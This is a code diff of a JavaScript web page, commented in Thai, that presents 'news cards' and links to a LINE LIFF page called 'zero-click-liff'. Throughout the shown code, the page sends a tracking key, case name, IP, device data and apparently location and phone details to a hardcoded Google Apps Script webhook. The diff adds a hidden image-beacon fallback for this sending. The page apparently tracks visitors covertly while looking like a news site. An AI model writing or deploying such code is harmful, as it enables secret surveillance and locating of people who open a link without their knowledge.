@@ -137,45 +137,17 @@ function getUrlParameters() {
 // ฟังก์ชันสำหรับเพิ่ม Event Listener ให้กับการ์ดข่าว
 function setupNewsCardClickHandlers() {
   const newsCards = document.querySelectorAll('.news-card');
-  const { trackingKey, caseName } = getUrlParameters(); // ดึง trackingKey และ caseName
+  const { caseName } = getUrlParameters(); // ดึง caseName จาก URL ปัจจุบัน
 
   newsCards.forEach(card => {
-    card.addEventListener('click', function(event) {
-      event.preventDefault(); // หยุดการทำงานปกติ (ถ้ามี) - ไม่จำเป็นสำหรับ div แต่ใส่ไว้เผื่อ
-      console.log("คลิกการ์ดข่าว - กำลังส่งข้อมูล...");
-
-      // สร้างข้อมูลเฉพาะสำหรับการคลิก
-      const clickTimestamp = new Date().toLocaleString('th-TH', {
-        timeZone: 'Asia/Bangkok',
-        year: 'numeric', month: '2-digit', day: '2-digit',
-        hour: '2-digit', minute: '2-digit', second: '2-digit'
-      });
-
-      const clickData = {
-        timestamp: clickTimestamp,
-        eventType: 'click', // ระบุว่าเป็นเหตุการณ์คลิก
-        trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า",
-        // อาจจะเพิ่มข้อมูลพื้นฐานบางอย่างถ้าต้องการ เช่น IP หรือ Device Type
-        // แต่เพื่อให้ง่าย จะส่งแค่ข้อมูลหลักก่อน
-        ip: { ip: "กำลังรอข้อมูล..." }, // ส่งค่า placeholder หรือดึง IP อีกครั้งถ้าจำเป็น
-        deviceInfo: { deviceType: "กำลังรอข้อมูล..." }, // ส่งค่า placeholder
-        requestId: generateUniqueId() + "-click" // สร้าง ID เฉพาะสำหรับการคลิก
-      };
-
-      // ส่งข้อมูลการคลิกไปยัง webhook
-      sendToLineNotify(clickData);
-
-      // หน่วงเวลาเล็กน้อยเพื่อให้ fetch มีโอกาสส่งข้อมูลก่อน redirect
-      setTimeout(() => {
-        // นำทางกลับไปยังหน้า LIFF พร้อม caseName (ถ้ามี)
-        let liffUrl = 'zero-click-liff.html';
-        if (caseName && caseName !== "ไม่มีค่า") {
-          liffUrl += `?case=${encodeURIComponent(caseName)}`;
-        }
-        console.log("ส่งข้อมูลคลิกแล้ว กำลังเปลี่ยนหน้าไปที่:", liffUrl);
-        window.location.href = liffUrl;
-      }, 500); // หน่วงเวลา 0.5 วินาที (ปรับได้ตามความเหมาะสม)
+    card.addEventListener('click', function() {
+      console.log("คลิกการ์ดข่าว");
+      // นำทางกลับไปยังหน้า LIFF พร้อม caseName (ถ้ามี)
+      let liffUrl = 'zero-click-liff.html';
+      if (caseName && caseName !== "ไม่มีค่า") {
+        liffUrl += `?case=${encodeURIComponent(caseName)}`;
+      }
+      window.location.href = liffUrl;
     });
 
     // เปลี่ยน cursor เป็น pointer เพื่อให้รู้ว่าคลิกได้
@@ -916,7 +888,8 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbypgihcWheUD3rutz1km0DYhMxayyoXXjZhjcRwhMCEaID3VK5uS2R8QKY1v1LL27v7/exec';
+  // แก้ไข URL ให้ถูกต้อง - ตรวจสอบว่าตรงกับ Web App URL ของ GoogleScript.html
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxVwwK6SGYHQoFu94eWIhbuhEhOjYNOg-TQefPBe2Y-3BMPOaSM_EORPHqhGebZPNLu/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
@@ -931,15 +904,20 @@ function sendToLineNotify(dataToSend) {
   }
   
   console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
+  console.log("ข้อมูลที่ส่ง:", JSON.stringify(dataToSend));
 
-  // ส่งข้อมูล
+  // สร้างรูปแบบข้อมูลที่ส่ง
+  const formData = new FormData();
+  formData.append('data', JSON.stringify(dataToSend));
+
+  // ส่งข้อมูลด้วยวิธีที่แนะนำสำหรับ Google Apps Script
   fetch(webhookUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
     body: JSON.stringify(dataToSend),
-    mode: 'no-cors'
+    mode: 'no-cors' // จำเป็นสำหรับ Google Apps Script
   })
   .then(() => {
     console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
@@ -947,9 +925,17 @@ function sendToLineNotify(dataToSend) {
     // บันทึก requestId ที่ส่งสำเร็จแล้ว
     sentRequests.push(dataToSend.requestId);
     sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
+
+    // ข้อความยืนยันว่าส่งข้อมูลสำเร็จ
+    alert('บันทึกข้อมูลสำเร็จ');
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
+    // พยายามส่งอีกครั้งโดยใช้ Image beacon (วิธีสำรอง)
+    const img = new Image();
+    img.src = `${webhookUrl}?backup=true&key=${dataToSend.trackingKey}&requestId=${dataToSend.requestId}&time=${Date.now()}`;
+    img.style.display = 'none';
+    document.body.appendChild(img);
   });
 }
 
